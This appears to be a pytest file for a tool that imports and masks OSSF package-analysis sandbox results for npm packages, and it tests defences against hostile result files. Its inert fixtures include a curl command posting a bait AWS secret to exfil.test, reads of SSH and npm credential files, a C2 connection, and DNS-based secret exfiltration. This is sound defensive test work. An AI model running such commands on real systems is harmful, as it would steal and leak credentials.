"""The package-analysis importer: the rel-38 dynamic-result schema, read strictly and as hostile
data. Every fixture is hand-written from the Go structs at the pinned commit
(`pkg/api/analysisrun/result.go`, `docs/data_schema.md`): inert strings only, `.test` names,
documentation addresses, `/home/...` and `/root/...` paths. Nothing here is real output."""

from __future__ import annotations

import base64
import copy
import json
from typing import Any

import pytest

from kitsunox.core.models import PackageVersionRef
from kitsunox.rules.sandbox import BENIGN_HOSTS
from kitsunox.sandbox import ossf
from kitsunox.sandbox.models import GroupCount, ObservationKind, SandboxJob
from kitsunox.sandbox.ossf import (
    CANARY_MARK,
    DRIVER,
    ELLIPSIS,
    MAX_ARGV,
    MAX_ENV,
    MAX_FIELD_CHARS,
    MAX_HOSTNAMES,
    MAX_NAME_CHARS,
    MAX_TYPES,
    PRIORITY_BENIGN_HOSTS,
    RESULT_TOO_LARGE,
    STDIO_BYTES,
    UNVERSIONED_FILE,
    Cleaner,
    MalformedResultError,
    driver_argv,
    fair_quotas,
    keyed_sample,
    load_json,
    parse_dynamic,
    priority,
    result_file_names,
    sandbox_tarball,
)
from kitsunox.sandbox.spool import job_key
from kitsunox.util.hashing import sha256_hex

K = ObservationKind
SHA = "0" * 64
JOB = SandboxJob(
    ref=PackageVersionRef(ecosystem="npm", name="example-pkg", version="1.0.0"),
    tarball_sha256=SHA,
    integrity=None,
    hooks=("postinstall",),
    key=job_key(SHA, "example-pkg"),
)
# Inert fake baits in the shape rel-38 generates (`generateAWSKeys`).
BAIT_ID = "AKIAIEXAMPLEBAITXXXQ"
BAIT_SECRET = "aW5lcnQtdGVzdC1iYWl0LXZhbHVlLTMwLWJ5dGUh"  # noqa: S105 (an inert fake bait)
BAIT_ENV = ["HOME=/root", f"AWS_ACCESS_KEY_ID={BAIT_ID}", f"AWS_SECRET_ACCESS_KEY={BAIT_SECRET}"]
INSTALL_DRIVER = list(driver_argv(JOB, "install"))
KEY_MARK = CANARY_MARK.format(name="AWS_ACCESS_KEY_ID")
SECRET_MARK = CANARY_MARK.format(name="AWS_SECRET_ACCESS_KEY")


def driver(phase: str = "install", env: list[str] | None = None) -> dict[str, Any]:
    """package-analysis's own driver command, with the planted environment."""
    argv = [DRIVER, "--local", f"/{JOB.key}.tgz", phase, "example-pkg"]
    return {"Command": argv, "Environment": BAIT_ENV if env is None else env}


# A whole result, as package-analysis's `json.Marshal` writes it (compact, every field present).
FIXTURE = (
    '{"Package":{"Ecosystem":"npm","Name":"example-pkg","Version":"1.0.0"},'
    '"CreatedTimestamp":1767225600,"Analysis":{"install":{"Status":"completed",'
    '"Stdout":"YWRkZWQgMSBwYWNrYWdlCg==","Stderr":null,'
    '"Files":[{"Path":"/home/dev/.npmrc","Read":true,"Write":false,"Delete":false},'
    '{"Path":"/root/.ssh/id_rsa","Read":true,"Write":false,"Delete":false},'
    '{"Path":"/home/dev/stage.sh","Read":false,"Write":true,"Delete":true}],'
    '"Sockets":[{"Address":"192.0.2.10","Port":443,"Hostnames":["exfil.test","cdn.test"]},'
    '{"Address":"198.51.100.7","Port":0,"Hostnames":[]}],'
    f'"Commands":[{json.dumps(driver())},'
    f'{{"Command":["sh","-c","node postinstall.js"],"Environment":{json.dumps(BAIT_ENV)}}},'
    f'{{"Command":["curl","-d","{BAIT_SECRET}","https://exfil.test/c"],"Environment":null}}],'
    '"DNS":[{"Class":"IN","Queries":[{"Hostname":"exfil.test","Types":["AAAA","A"]},'
    '{"Hostname":"cdn.test","Types":["A"]}]}]},'
    '"import":{"Status":"completed","Stdout":null,"Stderr":null,"Files":null,'
    '"Sockets":null,"Commands":null,"DNS":null}}}'
)


def summary(**overrides: Any) -> dict[str, Any]:
    fields: dict[str, Any] = {
        "Status": "completed",
        "Stdout": None,
        "Stderr": None,
        "Files": None,
        "Sockets": None,
        "Commands": None,
        "DNS": None,
    }
    fields.update(overrides)
    return fields


def record(analysis: Any = None, **package: str) -> dict[str, Any]:
    key = {"Ecosystem": "npm", "Name": "example-pkg", "Version": "1.0.0"} | package
    return {
        "Package": key,
        "CreatedTimestamp": 1767225600,
        "Analysis": {"install": summary()} if analysis is None else analysis,
    }


def encode(raw: Any) -> bytes:
    return json.dumps(raw).encode()


def parse(raw: Any) -> ossf.SandboxResult:
    return parse_dynamic(raw if isinstance(raw, bytes) else encode(raw), JOB)


def rejected(raw: Any) -> str:
    with pytest.raises(MalformedResultError) as caught:
        parse(raw)
    return str(caught.value)


# --- the fixture --------------------------------------------------------------------------------


def test_the_fixture_parses_into_phases_and_observations() -> None:
    result = parse(FIXTURE.encode())
    run = result.run
    assert run.job == JOB
    assert run.status == "completed"
    assert run.result_sha256 == sha256_hex(FIXTURE.encode())
    assert run.created == 1767225600
    assert (run.truncated, run.cuts) == (False, {})
    assert run.network == "airgapped"
    assert run.canaries == ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY")
    install, imported = run.phases
    assert (install.phase, install.status, install.stdout, install.stderr) == (
        "install",
        "completed",
        "added 1 package\n",
        "",
    )
    assert (imported.phase, imported.status) == ("import", "completed")
    kinds = [(o.kind, o.source) for o in result.observations]
    assert kinds == [
        (K.EXEC, "strace"),
        (K.EXEC, "strace"),
        (K.EXEC, "strace"),
        (K.OPEN, "strace"),
        (K.OPEN, "strace"),
        (K.OPEN, "strace"),
        (K.CONNECT, "strace"),
        (K.CONNECT, "strace"),
        (K.CONNECT, "strace"),
        (K.DNS, "pcap"),
        (K.DNS, "pcap"),
    ]
    assert run.observation_count == len(result.observations)
    assert all(o.phase == "install" for o in result.observations)
    # Every group's counts are recorded, cut or not. Priority: the driver (the tarball's path)
    # and curl (a URL, a bait), sh (a shell); both credential files and the write outside npm's
    # directories; every socket and DNS name off the benign list.
    assert run.groups == (
        GroupCount(phase="install", kind=K.EXEC, recorded=3, kept=3, priority=3, priority_kept=3),
        GroupCount(phase="install", kind=K.OPEN, recorded=3, kept=3, priority=3, priority_kept=3),
        GroupCount(
            phase="install", kind=K.CONNECT, recorded=3, kept=3, priority=3, priority_kept=3
        ),
        GroupCount(phase="install", kind=K.DNS, recorded=2, kept=2, priority=2, priority_kept=2),
    )


def test_files_become_opens_with_their_flags() -> None:
    opens = {o.path: o.flags for o in parse(FIXTURE.encode()).observations if o.kind is K.OPEN}
    assert opens == {
        "/home/dev/.npmrc": ("read",),
        "/root/.ssh/id_rsa": ("read",),
        "/home/dev/stage.sh": ("write", "delete"),
    }


def test_sockets_become_one_connect_per_hostname_in_file_order() -> None:
    connects = [
        (o.address, o.port, o.host)
        for o in parse(FIXTURE.encode()).observations
        if o.kind is K.CONNECT
    ]
    assert connects == [
        ("192.0.2.10", 443, "exfil.test"),
        ("192.0.2.10", 443, "cdn.test"),
        ("198.51.100.7", None, None),  # port 0 is "unknown"; no name resolved to it
    ]


def test_dns_queries_with_class_and_sorted_types_in_file_order() -> None:
    dns = [(o.host, o.detail) for o in parse(FIXTURE.encode()).observations if o.kind is K.DNS]
    assert dns == [("exfil.test", "IN A AAAA"), ("cdn.test", "IN A")]


def test_baits_are_masked_everywhere() -> None:
    result = parse(FIXTURE.encode())
    shown = json.dumps([o.model_dump(mode="json") for o in result.observations])
    assert BAIT_ID not in shown and BAIT_SECRET not in shown
    curl = next(o for o in result.observations if o.argv[:1] == ("curl",))
    assert curl.argv[2] == SECRET_MARK
    sh = next(o for o in result.observations if o.argv[:1] == ("sh",))
    assert f"AWS_ACCESS_KEY_ID={KEY_MARK}" in sh.env


def test_bait_values_in_output_and_names_are_masked_too() -> None:
    out = base64.b64encode(f"token {BAIT_SECRET}".encode()).decode()
    raw = record(
        {
            "install": summary(
                Stdout=out,
                Commands=[driver(), {"Command": ["node"], "Environment": BAIT_ENV}],
                DNS=[
                    {
                        "Class": "IN",
                        "Queries": [{"Hostname": f"{BAIT_SECRET}.x.test", "Types": ["TXT"]}],
                    }
                ],
            )
        }
    )
    result = parse(raw)
    assert result.run.phases[0].stdout == f"token {SECRET_MARK}"
    dns = next(o for o in result.observations if o.kind is K.DNS)
    assert dns.host == f"{SECRET_MARK}.x.test"


def test_a_lowercased_bait_in_a_dns_name_is_masked() -> None:
    """Round-3 review: lowercasing (the natural DNS transform) dropped the CRITICAL."""
    queries = [{"Hostname": f"{BAIT_ID.lower()}.x.test", "Types": ["A"]}]
    raw = with_install(Commands=[driver()], DNS=[{"Class": "IN", "Queries": queries}])
    dns = next(o for o in parse(raw).observations if o.kind is K.DNS)
    assert dns.host == f"{KEY_MARK}.x.test"


def test_baits_come_only_from_package_analysiss_driver() -> None:
    """Round-3 review: a child given `AWS_ACCESS_KEY_ID=<its C2 address>` made the address a
    bait, masked in every observation. Only the driver's environment is read now."""
    c2 = "203.0.113.99"
    child = {"Command": ["node", "x.js"], "Environment": [f"AWS_ACCESS_KEY_ID={c2}"]}
    sockets = [{"Address": c2, "Port": 4444, "Hostnames": []}]
    result = parse(with_install(Commands=[child], Sockets=sockets))
    assert result.run.canaries == ()
    connect = next(o for o in result.observations if o.kind is K.CONNECT)
    assert connect.address == c2
    # The same environment on a bait-shaped value outside the driver is not a bait either.
    shaped = {"Command": ["node", "x.js"], "Environment": [f"AWS_ACCESS_KEY_ID={BAIT_ID}"]}
    curl = {"Command": ["curl", BAIT_ID], "Environment": None}
    result = parse(with_install(Commands=[shaped, curl]))
    assert result.run.canaries == ()
    assert ("curl", BAIT_ID) in [o.argv for o in result.observations]


def test_driver_values_not_in_the_generators_shape_are_not_baits() -> None:
    env = ["AWS_ACCESS_KEY_ID=evil-c2.example.test", "AWS_SECRET_ACCESS_KEY=short", "OTHER=x"]
    dns = [{"Class": "IN", "Queries": [{"Hostname": "evil-c2.example.test", "Types": ["A"]}]}]
    result = parse(with_install(Commands=[driver(env=env)], DNS=dns))
    assert result.run.canaries == ()
    assert result.observations[-1].host == "evil-c2.example.test"


def test_the_driver_is_recognised_as_started_or_through_its_node_shebang() -> None:
    argv = ["/usr/bin/node", *INSTALL_DRIVER]
    curl = {"Command": ["curl", BAIT_SECRET], "Environment": None}
    shebang = {"Command": argv, "Environment": BAIT_ENV}
    result = parse(with_install(Commands=[shebang, curl]))
    assert result.run.canaries == ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY")
    assert ("curl", SECRET_MARK) in [o.argv for o in result.observations]
    # Another tarball path, phase or name is not package-analysis's driver for this job.
    for wrong in (
        [DRIVER, "--local", "/other.tgz", "install", "example-pkg"],
        [DRIVER, "--local", f"/{JOB.key}.tgz", "import", "example-pkg"],  # in install
        [DRIVER, "--local", f"/{JOB.key}.tgz", "install", "other-pkg"],
        ["/bin/sh", *INSTALL_DRIVER],
    ):
        forged = {"Command": wrong, "Environment": BAIT_ENV}
        assert parse(with_install(Commands=[forged])).run.canaries == ()


def test_each_phases_driver_carries_the_baits() -> None:
    curl = {"Command": ["curl", BAIT_ID], "Environment": None}
    raw = record({"install": summary(), "import": summary(Commands=[driver("import"), curl])})
    result = parse(raw)
    assert ("curl", KEY_MARK) in [o.argv for o in result.observations]


OTHER_ID = "AKIAIFORGEDBAITXXXXQ"
OTHER_SECRET = "Zm9yZ2VkLWJhaXQtdmFsdWUtMzAtYnl0ZXMtLS0h"  # noqa: S105 (an inert fake)
OTHER_ENV = [f"AWS_ACCESS_KEY_ID={OTHER_ID}", f"AWS_SECRET_ACCESS_KEY={OTHER_SECRET}"]


def test_forged_drivers_after_the_first_are_ignored_and_counted() -> None:
    """Round-4 review: four forged drivers before the real one pushed its values out of the
    four kept per name, so `curl -d <real secret>` lost its mark. Now each phase's first
    driver with both baits in shape is the driver, and later ones with other values are
    forgeries: ignored (not masked) and counted, however many."""
    forged = [driver(env=[*OTHER_ENV, f"N={i}"]) for i in range(50)]
    curl = {"Command": ["curl", "-d", BAIT_SECRET], "Environment": None}
    result = parse(with_install(Commands=[driver(), *forged, curl]))
    assert result.run.cuts == {"forged_drivers": 50}
    assert result.run.truncated is True
    assert ("curl", "-d", SECRET_MARK) in [o.argv for o in result.observations]
    assert any(f"AWS_ACCESS_KEY_ID={OTHER_ID}" in o.env for o in result.observations)


def test_the_drivers_node_line_is_not_a_forgery() -> None:
    """`#!/usr/bin/env node` makes the driver's execve a second one, `node <driver> ...`, with
    the same environment: the same values, not a forgery."""
    shebang = {"Command": ["node", *INSTALL_DRIVER], "Environment": BAIT_ENV}
    result = parse(with_install(Commands=[driver(), shebang]))
    assert (result.run.cuts, result.run.canaries) == (
        {},
        ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"),
    )


def test_a_driver_needs_both_baits_once_each_in_shape() -> None:
    """A driver-shaped command missing a name, repeating one, or with a value out of shape is
    not the driver (and costs nothing): the next one that qualifies is."""
    curl = {"Command": ["curl", BAIT_ID, OTHER_ID], "Environment": None}
    for env in (
        [f"AWS_ACCESS_KEY_ID={OTHER_ID}"],
        [*OTHER_ENV, f"AWS_ACCESS_KEY_ID={OTHER_ID}"],
        [f"AWS_ACCESS_KEY_ID={OTHER_ID}", "AWS_SECRET_ACCESS_KEY=short"],
        [f"AWS_ACCESS_KEY_ID={OTHER_ID.lower()}", f"AWS_SECRET_ACCESS_KEY={OTHER_SECRET}"],
    ):
        result = parse(with_install(Commands=[driver(env=env), driver(), curl]))
        assert result.run.cuts == {}
        assert ("curl", KEY_MARK, OTHER_ID) in [o.argv for o in result.observations]


def test_a_forged_driver_first_in_order_wins_but_is_counted() -> None:
    """Upstream sorts commands by argv then environment, so a forgery can sort before the real
    driver. It then takes the phase, and the real values are not masked; but the real driver
    follows it, so the forgery is always counted."""
    early = driver(env=["!=x", *OTHER_ENV])  # sorts before "HOME=..."
    curl = {"Command": ["curl", BAIT_ID], "Environment": None}
    result = parse(with_install(Commands=[early, driver(), curl]))
    assert result.run.cuts == {"forged_drivers": 1}
    assert ("curl", BAIT_ID) in [o.argv for o in result.observations]


def test_phases_whose_drivers_disagree_are_counted_and_both_masked() -> None:
    """package-analysis plants one pair per sandbox, and both phases run in it: different
    values in the phases' drivers mean one is forged. Both pairs are masked."""
    curl = {"Command": ["curl", BAIT_ID, OTHER_ID], "Environment": None}
    raw = record(
        {
            "install": summary(Commands=[driver(env=OTHER_ENV), driver(), curl]),
            "import": summary(Commands=[driver("import")]),
        }
    )
    result = parse(raw)
    assert result.run.cuts == {"forged_drivers": 1, "bait_mismatch": 1}
    assert ("curl", KEY_MARK, KEY_MARK) in [o.argv for o in result.observations]
    same = record(
        {"install": summary(Commands=[driver()]), "import": summary(Commands=[driver("import")])}
    )
    assert parse(same).run.cuts == {}


def test_many_fake_baits_in_child_environments_cost_nothing() -> None:
    """Round-3 review: every child's AWS value was a bait, so masking was O(strings x baits)."""
    commands = [
        {"Command": ["node", f"x{i}.js"], "Environment": [f"AWS_SECRET_ACCESS_KEY={i:040d}"]}
        for i in range(3000)
    ]
    result = parse(with_install(Commands=commands))
    assert result.run.canaries == ()
    assert result.run.observation_count == 3000


# --- determinism ----------------------------------------------------------------------------------


def test_go_map_order_changes_only_the_order() -> None:
    """DNS classes, queries, types and hostnames come from Go map iteration: random order.
    The importer keeps file order (so nothing sorts the package's strings first); the set of
    observations and everything else about the run is the same, and the rules sort for
    themselves."""
    raw = json.loads(FIXTURE)
    shuffled = copy.deepcopy(raw)
    install = shuffled["Analysis"]["install"]
    install["DNS"][0]["Queries"].reverse()
    for query in install["DNS"][0]["Queries"]:
        query["Types"].reverse()
    install["Sockets"][0]["Hostnames"].reverse()
    install["Files"].reverse()
    install["Commands"].reverse()
    first, second = parse(raw), parse(shuffled)
    assert set(first.observations) == set(second.observations)
    assert first.observations != second.observations
    assert first.run.model_copy(update={"result_sha256": ""}) == second.run.model_copy(
        update={"result_sha256": ""}
    )
    assert parse(raw).observations == first.observations  # the same bytes, the same tuple


def test_duplicates_are_recorded_once() -> None:
    file = {"Path": "/home/dev/x", "Read": True, "Write": False, "Delete": False}
    result = parse(record({"install": summary(Files=[file, file])}))
    assert len(result.observations) == 1


def test_phases_are_kept_apart_and_in_order() -> None:
    file = {"Path": "/home/dev/x", "Read": True, "Write": False, "Delete": False}
    raw = record({"import": summary(Files=[file]), "install": summary(Files=[file])})
    result = parse(raw)
    assert [o.phase for o in result.observations] == ["install", "import"]
    assert [p.phase for p in result.run.phases] == ["install", "import"]


# --- status ---------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("analysis", "status"),
    [
        ({"install": summary(Status="error_analysis")}, "failed"),
        ({"install": summary(), "import": summary(Status="error_analysis")}, "failed"),
        ({"install": summary(Status="error_timeout")}, "timeout"),
        ({"install": summary(Status="error_other")}, "infra-error"),
        (
            {"install": summary(Status="error_analysis"), "import": summary(Status="error_other")},
            "infra-error",
        ),
        ({"import": summary()}, "infra-error"),  # no install phase recorded
        ({}, "infra-error"),
        ({"install": None, "import": None}, "infra-error"),
        ({"install": summary(), "import": summary(), "execute": summary()}, "completed"),
    ],
)
def test_run_status(analysis: dict[str, Any], status: str) -> None:
    assert parse(record(analysis)).run.status == status


def test_null_analysis_is_an_infra_error_with_nothing_observed() -> None:
    raw = record()
    raw["Analysis"] = None
    result = parse(raw)
    assert (result.run.status, result.run.phases, result.observations) == ("infra-error", (), ())


# --- identity -------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "package",
    [{"Name": "other-pkg"}, {"Version": "1.0.1"}, {"Version": ""}, {"Ecosystem": "pypi"}],
)
def test_a_result_for_another_package_or_version_is_rejected(package: dict[str, str]) -> None:
    assert rejected(record(**package)) == "the result is for another package or version"


def test_the_name_is_compared_lowercased_as_package_analysis_writes_it() -> None:
    upper = JOB.model_copy(update={"ref": JOB.ref.model_copy(update={"name": "Example-PKG"})})
    assert parse_dynamic(encode(record()), upper).run.status == "completed"


def test_the_name_compared_is_the_one_package_analysis_was_given() -> None:
    """With manifest confusion, -package is the tarball's own name (`install_name`)."""
    confused = JOB.model_copy(
        update={"ref": JOB.ref.model_copy(update={"name": "registry-name"}), "install_name": "x"}
    )
    assert parse_dynamic(encode(record(Name="x")), confused).run.status == "completed"
    with pytest.raises(MalformedResultError):
        parse_dynamic(encode(record(Name="registry-name")), confused)


def test_every_job_and_run_is_airgapped() -> None:
    assert (JOB.network, parse_dynamic(encode(record()), JOB).run.network) == (
        "airgapped",
        "airgapped",
    )
    with pytest.raises(ValueError, match="network"):
        SandboxJob.model_validate(JOB.model_dump() | {"network": "offline"})


def test_result_file_names() -> None:
    assert result_file_names(JOB) == ("1.0.0.json", UNVERSIONED_FILE)
    odd = JOB.model_copy(update={"ref": JOB.ref.model_copy(update={"version": "../1.0.0"})})
    assert result_file_names(odd) == (UNVERSIONED_FILE,)


# --- hostile input --------------------------------------------------------------------------------


def with_install(**overrides: Any) -> dict[str, Any]:
    return record({"install": summary(**overrides)})


SCHEMA = "the result does not follow the package-analysis rel-38 schema"


@pytest.mark.parametrize(
    "raw",
    [
        with_install(Status="ok"),
        with_install(Status=None),
        with_install(Files=[{"Path": "/x", "Read": 1, "Write": False, "Delete": False}]),
        with_install(Files=[{"Path": "/x", "Read": "true", "Write": False, "Delete": False}]),
        with_install(Files=[{"Path": 7, "Read": True, "Write": False, "Delete": False}]),
        with_install(Files=[{"Path": "/x", "Read": True, "Write": False}]),  # a field missing
        with_install(
            Files=[{"Path": "/x", "Read": True, "Write": False, "Delete": False, "Mode": 1}]
        ),
        with_install(Files={"Path": "/x"}),
        with_install(Sockets=[{"Address": "192.0.2.1", "Port": True, "Hostnames": []}]),
        with_install(Sockets=[{"Address": "192.0.2.1", "Port": "443", "Hostnames": []}]),
        with_install(Sockets=[{"Address": "192.0.2.1", "Port": 70000, "Hostnames": []}]),
        with_install(Sockets=[{"Address": "192.0.2.1", "Port": 4.5, "Hostnames": []}]),
        with_install(Commands=[{"Command": ["sh"], "Environment": {"HOME": "/root"}}]),  # V1 form
        with_install(Commands=[{"Command": "sh -c x", "Environment": None}]),
        with_install(DNS=[{"Class": "IN", "Queries": [{"Hostname": ["a"], "Types": []}]}]),
        with_install(Stdout=12),
        record({"install": summary(), "postinstall": summary()}),  # not a phase
        record({"install": "completed"}),
        {k: v for k, v in record().items() if k != "CreatedTimestamp"},
        record() | {"Extra": 1},
        record() | {"CreatedTimestamp": "1767225600"},
        record() | {"CreatedTimestamp": 2**63},
        record() | {"Package": {"Ecosystem": "npm", "Name": "example-pkg"}},
        [record()],
        "a string",
        None,
    ],
)
def test_wrong_types_and_shapes_are_rejected(raw: Any) -> None:
    assert rejected(raw) == SCHEMA


def test_a_summary_missing_a_field_is_rejected() -> None:
    raw = with_install()
    del raw["Analysis"]["install"]["Stdout"]  # Go writes every field, nil as null
    assert rejected(raw) == SCHEMA


def test_hostile_json_is_rejected_not_raised() -> None:
    good = encode(record())
    assert rejected(b"[" * 200_000 + b"]" * 200_000) == "the result is nested too deeply"
    assert rejected(
        good.replace(b'"CreatedTimestamp"', b'"CreatedTimestamp": 1, "CreatedTimestamp"')
    ) == ("the result repeats a key in an object")
    assert rejected(good.replace(b"1767225600", b"NaN")) == "the result is not valid JSON"
    assert rejected(good.replace(b"1767225600", b"1" * 5000)) == "the result is not valid JSON"
    assert rejected(good[:-1]) == "the result is not valid JSON"
    assert rejected(b"\xff\xfe" + good) == "the result is not UTF-8"
    assert rejected(b"") == "the result is not valid JSON"


def test_a_huge_result_is_rejected_before_parsing(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ossf, "MAX_RESULT_BYTES", 100)
    with pytest.raises(MalformedResultError) as caught:
        load_json(b" " * 101, ossf.MAX_RESULT_BYTES)
    assert str(caught.value) == RESULT_TOO_LARGE
    assert load_json(b"[]") == []


def test_output_must_be_base64_of_sane_size() -> None:
    assert rejected(with_install(Stdout="not base64!")) == "an output field is not base64"
    huge = base64.b64encode(b"x" * 60_000).decode()
    assert rejected(with_install(Stderr=huge)) == (
        "an output field is far over package-analysis's 4 KiB"
    )


def test_output_keeps_the_last_4_kib_as_text() -> None:
    tail = b"\xffend"
    out = base64.b64encode(b"a" * 5000 + tail).decode()
    run = parse(with_install(Stdout=out)).run
    stdout = run.phases[0].stdout
    assert stdout.endswith("\ufffdend")
    assert len(stdout.encode()) <= STDIO_BYTES + 2  # one invalid byte became U+FFFD
    assert run.cuts == {"output_bytes": 1}  # package-analysis keeps 4 KiB; more is a cut


# --- caps and cleaning ----------------------------------------------------------------------------


def test_strings_are_capped_with_an_ellipsis_and_counted() -> None:
    long = "/home/dev/" + "a" * MAX_FIELD_CHARS
    file = {"Path": long, "Read": True, "Write": False, "Delete": False}
    result = parse(with_install(Files=[file]))
    (opened,) = result.observations
    assert opened.path is not None
    assert len(opened.path) == MAX_FIELD_CHARS + 1 and opened.path.endswith(ELLIPSIS)
    assert (result.run.truncated, result.run.cuts) == (True, {"field_chars": 1})


def test_padding_no_longer_hides_a_bait_or_a_command() -> None:
    """Round-3 review (S1, S3b): 1100 characters of padding pushed a bait and `npm publish`
    past the old 1024-character cap, silently. A real argv item fits whole now."""
    pad = " " * 1100
    commands = [
        driver(),
        {"Command": ["curl", "-d", f"{pad}k={BAIT_SECRET}"], "Environment": None},
        {"Command": ["sh", "-c", f":{pad}; npm publish"], "Environment": None},
    ]
    result = parse(with_install(Commands=commands))
    argv = [o.argv for o in result.observations]
    assert ("curl", "-d", f"{pad}k={SECRET_MARK}") in argv
    assert ("sh", "-c", f":{pad}; npm publish") in argv
    assert result.run.truncated is False


def test_argv_and_env_are_capped_with_an_ellipsis_item_and_counted() -> None:
    argv = [f"arg{i}" for i in range(MAX_ARGV + 10)]
    env = [f"V{i}=x" for i in range(MAX_ENV + 1)]
    result = parse(with_install(Commands=[{"Command": argv, "Environment": env}]))
    (command,) = result.observations
    assert command.argv == (*argv[:MAX_ARGV], ELLIPSIS)
    assert command.env == (*env[:MAX_ENV], ELLIPSIS)
    assert result.run.cuts == {"argv_items": 1, "env_items": 1}
    assert result.run.truncated is True


def test_names_hostnames_and_types_are_capped_and_counted() -> None:
    names = [f"n{i}.test" for i in range(MAX_HOSTNAMES + 3)]
    long = "a" * (MAX_NAME_CHARS + 1)
    types = [f"T{i}" for i in range(MAX_TYPES + 1)]
    result = parse(
        with_install(
            Sockets=[{"Address": "192.0.2.1", "Port": 443, "Hostnames": names}],
            DNS=[{"Class": "IN", "Queries": [{"Hostname": long, "Types": types}]}],
        )
    )
    connects = [o for o in result.observations if o.kind is K.CONNECT]
    assert [o.host for o in connects] == names[:MAX_HOSTNAMES]  # in file order
    (dns,) = [o for o in result.observations if o.kind is K.DNS]
    assert dns.host == "a" * MAX_NAME_CHARS + ELLIPSIS
    assert result.run.cuts == {"name_chars": 1, "hostnames": 1, "dns_types": 1}


def test_lone_surrogates_become_replacement_characters() -> None:
    raw = encode(
        with_install(Files=[{"Path": "/x", "Read": True, "Write": False, "Delete": False}])
    )
    raw = raw.replace(b'"/x"', b'"/home/dev/\\ud800x\\udfff"')
    (opened,) = parse(raw).observations
    assert opened.path == "/home/dev/\ufffdx\ufffd"
    opened.model_dump_json()  # encodable
    paired = raw.replace(b"\\ud800x\\udfff", b"\\ud83d\\ude00")
    assert parse(paired).observations[0].path == "/home/dev/\U0001f600"


def test_null_lists_are_empty() -> None:
    raw = with_install(
        Commands=[{"Command": None, "Environment": None}],
        Sockets=[{"Address": "192.0.2.1", "Port": 53, "Hostnames": None}],
        DNS=[
            {"Class": "IN", "Queries": None},
            {"Class": "IN", "Queries": [{"Hostname": "a.test", "Types": None}]},
        ],
    )
    observations = parse(raw).observations
    assert [(o.kind, o.argv, o.env, o.host, o.detail) for o in observations] == [
        (K.EXEC, (), (), None, None),
        (K.CONNECT, (), (), None, None),
        (K.DNS, (), (), "a.test", "IN"),
    ]


def test_cleaning_that_makes_two_entries_equal_keeps_one() -> None:
    raw = encode(
        with_install(
            Files=[
                {"Path": "/a", "Read": True, "Write": False, "Delete": False},
                {"Path": "/b", "Read": True, "Write": False, "Delete": False},
            ]
        )
    )
    raw = raw.replace(b'"/a"', b'"/\\ud800"').replace(b'"/b"', b'"/\\udfff"')
    assert [o.path for o in parse(raw).observations] == ["/\ufffd"]


# --- the observation cap --------------------------------------------------------------------------


def test_fair_quotas_share_the_cap_max_min() -> None:
    assert fair_quotas([5, 1, 100], 1000) == [5, 1, 100]  # under the cap: everything
    assert fair_quotas([5, 1, 100], 30) == [5, 1, 24]
    assert fair_quotas([50, 50, 50], 30) == [10, 10, 10]
    assert fair_quotas([50, 50, 50], 31) == [10, 10, 11]  # deterministic leftover
    assert fair_quotas([], 10) == []
    assert sum(fair_quotas([7, 300, 2, 41], 50)) == 50


def test_keyed_sample_is_deterministic_and_keyed() -> None:
    entries: list[tuple[object, ...]] = [(f"e{i}",) for i in range(100)]
    first = keyed_sample(entries, 10, b"a")
    assert first == keyed_sample(entries, 10, b"a") == sorted(first) and len(first) == 10
    assert keyed_sample(entries, 10, b"b") != first  # another result file, another sample
    assert first != [*range(5), *range(95, 100)]  # not the head and tail
    assert keyed_sample(entries, 200, b"a") == list(range(100))
    assert keyed_sample(entries, 0, b"a") == []


def tier(kind: ObservationKind, *raw: object, baits: tuple[tuple[str, str], ...] = ()) -> int:
    return priority(kind, raw, Cleaner(baits), sandbox_tarball(JOB))


def test_priority_tiers() -> None:
    tarball = sandbox_tarball(JOB)
    exec_tiers = {
        (DRIVER, "--local", tarball, "install", "x"): 0,
        ("sh", "-c", "npm publish"): 0,
        ("cat", "/root/.npmrc"): 0,
        ("/bin/true", "x", BAIT_ID.lower()): 0,
        ("/bin/true", "https://x.test"): 1,
        ("/usr/bin/python3.12", "a.py"): 1,
        ("/usr/local/bin/node", "x.js"): 1,
        ("gcc", "-c", "a.c"): 2,
        (): 2,
    }
    baits = (("AWS_ACCESS_KEY_ID", BAIT_ID),)
    for argv, expected in exec_tiers.items():
        assert tier(K.EXEC, argv, ("HOME=/root",), baits=baits) == expected, argv
    open_tiers = {
        ("/root/.ssh/id_rsa", True, False, False): 0,
        ("/home/dev/.config/gh/hosts.yml", True, False, False): 0,
        ("/app/.env.local", True, False, False): 0,
        ("/proc/1/environ", True, False, False): 0,
        (tarball, False, True, False): 0,
        ("/tmp/x", False, True, False): 1,  # noqa: S108 (a path inside the sandbox)
        ("/app/node_modules/x/index.js", False, True, False): 2,
        ("/root/.npm/_cacache/x", False, False, True): 2,
        ("/usr/lib/x.so", True, False, False): 2,
    }
    for raw, expected in open_tiers.items():
        assert tier(K.OPEN, *raw) == expected, raw
    assert tier(K.CONNECT, "192.0.2.1", 443, None) == 0
    assert tier(K.CONNECT, "192.0.2.1", 443, "evil.test") == 0
    assert tier(K.CONNECT, "192.0.2.1", 443, "Registry.npmjs.org.") == 2
    assert tier(K.DNS, "IN", "nodejs.org", ("A",)) == 2
    assert tier(K.DNS, "IN", "x.nodejs.org.evil.test", ("A",)) == 0


def test_the_benign_hosts_are_the_rules() -> None:
    """The importer can't import the rules (they import it): a test keeps the lists equal."""
    assert PRIORITY_BENIGN_HOSTS == BENIGN_HOSTS


def test_a_flood_cannot_push_out_the_other_kinds_or_choose_survivors(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Round-3 review (S4): 100,001 execs with low-sorting argv pushed out the real commands
    and every other kind, because the cut kept the lexicographically smallest. Now each
    (phase, kind) keeps a fair share, high-value entries first, and the cut is counted."""
    monkeypatch.setattr(ossf, "MAX_OBSERVATIONS", 12)
    flood = [{"Command": [f"!{i:06d}"], "Environment": []} for i in range(1000)]
    real = {"Command": ["curl", "-d", BAIT_SECRET, "https://x.test"], "Environment": None}
    commands = [driver(), *flood, real]
    files = [{"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False, "Delete": False}]
    dns = [{"Class": "IN", "Queries": [{"Hostname": f"{BAIT_ID}.x.test", "Types": ["A"]}]}]
